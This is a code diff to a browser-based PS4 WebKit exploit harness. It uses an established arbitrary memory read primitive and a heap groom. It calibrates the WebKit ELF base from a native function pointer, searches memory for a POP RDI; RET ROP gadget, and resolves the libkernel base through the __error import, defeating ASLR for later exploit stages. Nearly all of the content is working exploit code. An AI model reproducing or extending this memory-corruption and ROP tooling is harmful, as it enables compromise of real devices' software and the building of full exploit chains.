@@ -1,8 +1,9 @@
 import { int64 } from "./int64.js";
 import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
+import { installWindowP, pairStatus, promoteToRealPair } from "./mem.js";
 
 let outEl, stateEl, fwSelect, attemptsSelect;
-let btnEstablish, btnOffsets, btnCalibrate, btnAll, btnClear, btnLowMem;
+let btnEstablish, btnOffsets, btnCalibrate, btnCalibrateErr, btnAll, btnClear, btnLowMem;
 
 const params = new URLSearchParams(location.search);
 const lines = [];
@@ -16,15 +17,18 @@ let calibratedOff = null;
 const CORE_LOG = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP|ATTEMPT|SSV-|AUTO-RETRY|CORE-GIVE|COMPOSITION|PRIMITIVE/i;
 const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;
 
-const SCAN_MAX_DELTA = 0x03000000;
-const SCAN_YIELD_EVERY = 16;
+const SCAN_YIELD_EVERY = 8;
+const LOG_MAX = 120;
+const NARROW_SCAN_RADIUS = 0x80000;
 
 function mark(tag, detail) {
     if (!outEl) return;
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
     lines.push(line);
+    if (lines.length > LOG_MAX)
+        lines.splice(0, lines.length - LOG_MAX);
     const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
-    outEl.innerHTML = lines.map(l => esc(l)).join("\n");
+    outEl.textContent = lines.join("\n");
     outEl.scrollTop = outEl.scrollHeight;
 }
 
@@ -38,7 +42,7 @@ function clearLog() {
     lines.length = 0;
     passCount = 0;
     failCount = 0;
-    if (outEl) outEl.innerHTML = "";
+    if (outEl) outEl.textContent = "";
 }
 
 function resolvedOffKey() {
@@ -70,6 +74,7 @@ function setUi() {
     btnEstablish.disabled = busy || primitiveDone;
     btnOffsets.disabled = busy || !hasP;
     btnCalibrate.disabled = busy || !hasP;
+    if (btnCalibrateErr) btnCalibrateErr.disabled = busy || !hasP || !calibratedOff;
     btnAll.disabled = busy || primitiveDone;
     btnClear.disabled = busy;
     fwSelect.disabled = busy || primitiveDone;
@@ -78,7 +83,38 @@ function setUi() {
 
 async function breathe(i) {
     if (i > 0 && (i % SCAN_YIELD_EVERY) === 0)
-        await new Promise(r => setTimeout(r, 0));
+        await new Promise(r => setTimeout(r, 16));
+}
+
+async function sweepAfterPromote(cycles, mbPerCycle, msPerCycle) {
+    mark("SWEEP", "cycles=" + cycles + " mb=" + mbPerCycle);
+    for (let i = 0; i < cycles; i++) {
+        let junk = [];
+        for (let k = 0; k < mbPerCycle; k++)
+            junk.push(new ArrayBuffer(0x100000));
+        junk.length = 0;
+        junk = null;
+        await new Promise(r => setTimeout(r, msPerCycle));
+    }
+}
+
+async function ensureMemoryForScan() {
+    if (pairStatus.promoted) {
+        mark("PROMOTE", "already promoted");
+        return;
+    }
+    mark("PROMOTE", "releasing groom (~137MB) before calibrate...");
+    try {
+        promoteToRealPair((t, d) => mark(t, d || ""));
+        if (pairStatus.promoted) {
+            mark("PROMOTE-OK", "stage=" + pairStatus.stage);
+            await sweepAfterPromote(3, 4, 50);
+        } else {
+            mark("PROMOTE-SKIP", "state=" + pairStatus.state);
+        }
+    } catch (err) {
+        mark("PROMOTE-WARN", (err.message || String(err)) + " — table-hint may still work");
+    }
 }
 
 async function withBusy(fn) {
@@ -164,54 +200,72 @@ function nativeExpm1Quiet(p, mFunctionOff) {
     return safeRead8(p, mid.add32(mFunctionOff));
 }
 
-async function findWebkitBaseElf(p, nativeFn) {
+async function tryTableHint(p, tableOff) {
+    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
+    const nativeFn = nativeExpm1Quiet(p, mFunctionOff);
+    if (!nativeFn)
+        return null;
+    const hint = tableOff.wk_expm1_builtin;
+    if (hint == null)
+        return { nativeFn, hintFailed: true };
+    const base = nativeFn.sub32(hint);
+    if (alignedWebkitBase(base) && safeRead4(p, base) === 0x464c457f)
+        return { base, wk_expm1_builtin: hint, via: "table-hint", nativeFn };
+    return { nativeFn, hintFailed: true, hint };
+}
+
+async function narrowScanWebkitBase(p, nativeFn, hintDelta, gadgetRva) {
     if (!plausibleUserPtr(nativeFn)) return null;
-    let delta = nativeFn.low & 0x3fff;
+    const center = hintDelta != null ? hintDelta : (nativeFn.low & 0x3fff);
+    const start = Math.max(0, center - NARROW_SCAN_RADIUS);
+    const end = center + NARROW_SCAN_RADIUS;
     let steps = 0;
-    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
+    for (let delta = start; delta <= end; delta += 0x4000) {
         await breathe(steps++);
         const base = nativeFn.sub32(delta);
         if (!alignedWebkitBase(base)) continue;
-        const magic = safeRead4(p, base);
-        if (magic === 0x464c457f)
-            return { base, wk_expm1_builtin: delta, via: "elf" };
+        if (safeRead4(p, base) === 0x464c457f)
+            return { base, wk_expm1_builtin: delta, via: "narrow-elf" };
     }
-    return null;
-}
-
-async function findWebkitBaseGadget(p, nativeFn, gadgetRva) {
-    if (!plausibleUserPtr(nativeFn) || !gadgetRva) return null;
-    let delta = nativeFn.low & 0x3fff;
-    let steps = 0;
-    for (; delta < SCAN_MAX_DELTA; delta += 0x4000) {
+    if (!gadgetRva) return null;
+    mark("CAL-SCAN", "narrow ELF miss — POP_RDI @ 0x" + gadgetRva.toString(16));
+    for (let delta = start; delta <= end; delta += 0x4000) {
         await breathe(steps++);
         const base = nativeFn.sub32(delta);
         if (!alignedWebkitBase(base)) continue;
         const g = safeRead4(p, base.add32(gadgetRva));
         if (g != null && (g & 0xffff) === 0xc35f)
-            return { base, wk_expm1_builtin: delta, via: "gadget" };
+            return { base, wk_expm1_builtin: delta, via: "narrow-gadget" };
     }
     return null;
 }
 
-async function findWebkitBase(p, nativeFn, off) {
-    const elf = await findWebkitBaseElf(p, nativeFn);
-    if (elf) return elf;
-    const gadgetRva = off && off.wk_POP_RDI_RET;
-    if (gadgetRva) {
-        mark("CAL-SCAN", "ELF miss — POP_RDI @ 0x" + gadgetRva.toString(16));
-        return findWebkitBaseGadget(p, nativeFn, gadgetRva);
-    }
+function tryTableErrorImport(p, webkitBase, tableOff) {
+    if (!plausibleUserPtr(webkitBase) || !tableOff.wk___imp___error || !tableOff.k__error)
+        return null;
+    const errorFn = safeRead8(p, webkitBase.add32(tableOff.wk___imp___error));
+    if (!errorFn) return null;
+    const lk = errorFn.sub32(tableOff.k__error);
+    if (!plausibleLibkernelBase(lk)) return null;
+    const w0 = safeRead4(p, lk);
+    const w1 = safeRead4(p, lk.add32(4));
+    if (w0 == null || w1 == null) return null;
+    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
+        return {
+            wk___imp___error: tableOff.wk___imp___error,
+            k__error: tableOff.k__error,
+            libkernelBase: lk
+        };
     return null;
 }
 
 async function findErrorImport(p, webkitBase, hintRva) {
     if (!plausibleUserPtr(webkitBase) || !hintRva) return null;
     const hi = webkitBase.hi;
-    const start = Math.max(0, hintRva - 0x80000);
-    const end = hintRva + 0x80000;
+    const start = Math.max(0, hintRva - 0x20000);
+    const end = hintRva + 0x20000;
     let steps = 0;
-    for (let rva = start; rva < end; rva += 0x10) {
+    for (let rva = start; rva < end; rva += 0x40) {
         await breathe(steps++);
         const ptr = safeRead8(p, webkitBase.add32(rva));
         if (!ptr || ptr.hi <= hi || ptr.hi > hi + 4) continue;
@@ -274,33 +328,57 @@ function bufAddr(p, off, ab) {
     return safeRead8(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
 }
 
-async function calibrateOffsets(p, tableOff) {
-    mark("CALIBRATE", "light scan (yields to avoid OOM)");
-    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
-    const nativeFn = nativeExpm1Quiet(p, mFunctionOff);
-    if (!nativeFn) {
-        mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
-        return null;
-    }
-    mark("CAL-NATIVEFN", String(nativeFn));
+async function calibrateOffsets(p, tableOff, opts) {
+    const scanError = opts && opts.scanError;
+    mark("CALIBRATE", scanError ? "error-import scan" : "base only (no heavy scan)");
 
-    const wk = await findWebkitBase(p, nativeFn, tableOff);
+    await ensureMemoryForScan();
+    await new Promise(r => setTimeout(r, 0));
+
+    const mFunctionOff = tableOff.wk_JSFunction_m_function || 0x28;
+    let wk = null;
+    let nativeFn = null;
+
+    const hint = await tryTableHint(p, tableOff);
+    if (hint && hint.via === "table-hint") {
+        wk = hint;
+        nativeFn = hint.nativeFn;
+        mark("CAL-VIA", "table-hint (0 reads scan)");
+    } else {
+        nativeFn = hint && hint.nativeFn;
+        if (!nativeFn) {
+            mark("CALIBRATE-FAIL", "Math.expm1 native pointer unreadable");
+            return null;
+        }
+        mark("CAL-NATIVEFN", String(nativeFn));
+        mark("CALIBRATE", "table hint miss — narrow scan ±0x" + NARROW_SCAN_RADIUS.toString(16));
+        wk = await narrowScanWebkitBase(p, nativeFn, hint && hint.hint, tableOff.wk_POP_RDI_RET);
+    }
+
     if (!wk) {
-        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget)");
+        mark("CALIBRATE-FAIL", "webkit base not found (hint + narrow scan)");
         return null;
     }
+
     mark("CAL-VIA", wk.via);
     mark("CAL-WK-BASE", String(wk.base));
     mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));
 
-    mark("CALIBRATE", "scanning __imp___error (narrow window)...");
-    const err = await findErrorImport(p, wk.base, tableOff.wk___imp___error);
-    if (err) {
-        mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
-        mark("CAL-k__error", "0x" + err.k__error.toString(16));
-        mark("CAL-LK-BASE", String(err.libkernelBase));
+    let err = tryTableErrorImport(p, wk.base, tableOff);
+    if (err)
+        mark("CAL-ERROR", "table import OK (no scan)");
+    else if (scanError) {
+        mark("CALIBRATE", "scanning __imp___error (±0x20000)...");
+        err = await findErrorImport(p, wk.base, tableOff.wk___imp___error);
+        if (err) {
+            mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
+            mark("CAL-k__error", "0x" + err.k__error.toString(16));
+            mark("CAL-LK-BASE", String(err.libkernelBase));
+        } else {
+            mark("CALIBRATE-WARN", "__imp___error scan found nothing");
+        }
     } else {
-        mark("CALIBRATE-WARN", "__imp___error not found — webkit base still valid");
+        mark("CALIBRATE-WARN", "libkernel skipped — use step 3b if BASES needs lk");
     }
 
     const live = Object.assign({
@@ -314,7 +392,7 @@ async function calibrateOffsets(p, tableOff) {
     calibratedOff = live;
     mark("CALIBRATE-STORED", "step 2 will use calibrated wk_*");
 
-    mark("CALIBRATE", "verify with live offsets...");
+    mark("CALIBRATE", "verify...");
     let offsetFail = 0;
     const checkOffset = (name, ok, detail) => {
         if (ok) passCount++; else { failCount++; offsetFail++; }
@@ -369,7 +447,7 @@ async function runEstablish() {
     }
 
     installWindowP(carrier, {
-        promote: false,
+        promote: params.get("promote") === "1",
         onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
     });
 
@@ -456,7 +534,7 @@ async function runOffsetTests() {
     mark("DONE-OFFSETS", summary);
 }
 
-async function runCalibrate() {
+async function runCalibrate(scanError) {
     const p = window.p;
     if (!p) throw new Error("run step 1 first");
 
@@ -464,13 +542,15 @@ async function runCalibrate() {
     const { off } = offsetsForKey(offKey);
     if (!off) throw new Error("no offset table for fw=" + offKey);
 
-    mark("STEP", "3 - calibrate wk_*");
+    mark("STEP", scanError ? "3b - scan error import" : "3 - calibrate wk base");
     state("calibrating...", "warn");
 
-    const live = await calibrateOffsets(p, off);
-    if (live && live.wk_expm1_builtin != null) {
+    const live = scanError && calibratedOff
+        ? await calibrateOffsets(p, Object.assign({}, off, calibratedOff), { scanError: true })
+        : await calibrateOffsets(p, off, { scanError: !!scanError });
+
+    if (live && live.wk_expm1_builtin != null)
         mark("PASTE-OFFSETS", JSON.stringify(live, null, 0));
-    }
 
     state("calibrate done — run step 2", "ok");
     mark("DONE-CALIBRATE", "");
@@ -498,6 +578,7 @@ function init() {
     btnEstablish = document.getElementById("btn-establish");
     btnOffsets = document.getElementById("btn-offsets");
     btnCalibrate = document.getElementById("btn-calibrate");
+    btnCalibrateErr = document.getElementById("btn-calibrate-err");
     btnAll = document.getElementById("btn-all");
     btnClear = document.getElementById("btn-clear");
     btnLowMem = document.getElementById("btn-lowmem");
@@ -509,11 +590,13 @@ function init() {
 
     wireButton(btnEstablish, runEstablish);
     wireButton(btnOffsets, runOffsetTests);
-    wireButton(btnCalibrate, runCalibrate);
+    wireButton(btnCalibrate, () => runCalibrate(false));
+    if (btnCalibrateErr)
+        wireButton(btnCalibrateErr, () => runCalibrate(true));
     wireButton(btnAll, async () => {
         await runEstablish();
         await new Promise(r => setTimeout(r, 100));
-        await runCalibrate();
+        await runCalibrate(false);
     });
 
     btnClear.addEventListener("click", () => {
